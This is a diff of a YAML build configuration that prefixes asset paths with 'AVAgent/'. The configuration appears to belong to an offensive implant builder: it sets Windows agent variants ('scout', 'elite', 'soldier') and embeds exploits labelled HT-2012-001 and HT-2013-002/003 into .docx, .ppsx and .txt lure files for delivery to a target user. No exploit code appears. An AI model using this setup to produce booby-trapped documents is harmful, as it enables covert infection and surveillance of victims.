@@ -28,7 +28,7 @@ build_parameters:
           binary: {admin: false, demo: false}
           melt: {admin: false, bit64: true, codec: true, scout: true}
           platform: windows
-          meltfile: assets/windows/meltapp.exe
+          meltfile: AVAgent/assets/windows/meltapp.exe
           sign: {}
           package: {}
         windows_elite:
@@ -36,7 +36,7 @@ build_parameters:
           binary: {admin: false, demo: false}
           melt: {admin: false, bit64: true, codec: true, scout: false}
           platform: windows
-          meltfile: assets/windows/meltapp.exe
+          meltfile: AVAgent/assets/windows/meltapp.exe
           sign: {}
           package: {}
         windows_soldier:
@@ -44,7 +44,7 @@ build_parameters:
           binary: {admin: false, demo: false}
           melt: {admin: false, bit64: true, codec: true, scout: false, soldier: true}
           platform: windows
-          meltfile: assets/windows/meltapp.exe
+          meltfile: AVAgent/assets/windows/meltapp.exe
           sign: {}
           package: {}
         winphone:
@@ -77,7 +77,7 @@ build_parameters:
           platform_type: desktop
           deliver: {user: USERID}
           factory: {_id: '000'}
-          meltfile: assets/windows/meltexploit.txt
+          meltfile: AVAgent/assets/windows/meltexploit.txt
           generate:
             binary: {admin: false, demo: false}
             exploit: HT-2012-001
@@ -90,7 +90,7 @@ build_parameters:
           platform_type: desktop
           deliver: {user: USERID}
           factory: {_id: '000'}
-          meltfile : assets/windows/meltexploit.docx
+          meltfile : AVAgent/assets/windows/meltexploit.docx
           generate:
             binary: {admin: false, demo: false}
             exploit: HT-2013-002
@@ -103,7 +103,7 @@ build_parameters:
           platform_type: desktop
           deliver: {user: USERID}
           factory: {_id: '000'}
-          meltfile: assets/windows/meltexploit.ppsx
+          meltfile: AVAgent/assets/windows/meltexploit.ppsx
           generate:
             binary: {admin: false, demo: false}
             exploit: HT-2013-003
@@ -116,7 +116,7 @@ build_parameters:
           platform_type: desktop
           deliver: {user: USERID}
           factory: {_id: '000'}
-          meltfile : assets/windows/meltexploit.docx
+          meltfile : AVAgent/assets/windows/meltexploit.docx
           generate:
             binary: {admin: false, demo: false}
             exploit: HT-2013-002
